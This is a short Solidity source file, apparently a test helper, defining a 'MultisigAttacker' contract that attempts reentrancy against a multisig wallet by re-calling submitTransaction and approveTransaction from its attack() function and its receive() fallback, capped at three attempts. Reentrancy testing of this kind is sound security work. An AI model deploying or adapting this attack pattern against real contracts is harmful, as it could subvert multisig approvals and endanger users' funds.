// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface IMultisigCaller {
    function submitTransaction(address to, uint256 value, bytes memory data) external;
    function approveTransaction(uint256 txId) external;
}

contract MultisigAttacker {
    IMultisigCaller public immutable multisig;
    uint256 public attackCount;

    constructor(address _multisig) {
        multisig = IMultisigCaller(_multisig);
    }

    // Function to attempt reentrancy
    function attack() external {
        if (attackCount < 3) {
            attackCount++;
            multisig.submitTransaction(address(this), 0, abi.encodeWithSignature("attack()"));
            multisig.approveTransaction(attackCount);
        }
    }

    // Fallback function to attempt reentrancy
    receive() external payable {
        if (attackCount < 3) {
            attackCount++;
            multisig.approveTransaction(1);
        }
    }
}
